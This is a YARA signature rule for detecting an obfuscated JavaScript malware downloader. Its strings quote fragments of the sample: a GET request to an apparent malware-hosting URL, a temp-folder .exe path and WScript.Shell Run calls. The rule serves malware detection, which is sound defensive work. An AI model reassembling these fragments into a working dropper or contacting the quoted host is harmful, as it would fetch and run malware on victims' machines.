rule sig_20160328_d6df26b00b907e5200924651d1cdd4bb {
  meta:
    description = "datamaliciousorder - file 20160328_d6df26b00b907e5200924651d1cdd4bb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c1563632376c3d26a22ba4ef1430292e7b36d4cd54175a34c45271d0dac8fef2"

  strings:
    $s1  = "function Dryrk() {return Nhblqpkmbh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"NMGHe5cfac.exe\";};" fullword ascii
    $s2  = "Imrvxmtgl[Xwvjbud](\"GET\", \"http://finnskogen-oppvekstsenter.com/o4paka\", false);" fullword ascii
    $s3  = "do {WScript[Wgbolqp](Mnqdfni() * 11)} while (Imrvxmtgl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Znyvnalxfi(Jlomb, Dmzqjxrzqi){return Jlomb - Dmzqjxrzqi;};" fullword ascii
    $s5  = "var Nhblqpkmbh = function Cwerm() {return WScript[Xuebbfnwi](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bwqrhi(Fmqjasmply){Nhblqpkmbh[\"Run\"](Fmqjasmply, Xgcpy, Xgcpy);};" fullword ascii
    $s7  = "function Jefqjml() {return ((Sjnoytvrew == true) && (Sjnoytvrew == Fhtntv)) ? 1 : Xgcpy;};" fullword ascii
    $s8  = "Fhtntv = true; " fullword ascii
    $s9  = "var Fhtntv = false;" fullword ascii
    $s10 = "function Mnqdfni(){return 22;};" fullword ascii
    $s11 = " while (Vksflinrr){" fullword ascii
    $s12 = "var Heigrrai = false;" fullword ascii
    $s13 = "function Xiehvkv(){return Xuebbfnwi;};" fullword ascii
    $s14 = "var Sjnoytvrew = false;" fullword ascii
    $s15 = "return Znyvnalxfi(Cxkqxawoiw, Vzrbb);" fullword ascii
    $s16 = "Sjnoytvrew = true; " fullword ascii
    $s17 = "function Mtmhaw()" fullword ascii
    $s18 = "function Hyssqt(Ogedz) {var Cmqrc = (1, 2, 3, 4, 5, Ogedz); return Cmqrc;};" fullword ascii
    $s19 = "function Beylf(){return Crknbgkjk;};" fullword ascii
    $s20 = "var Ucaifrap = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}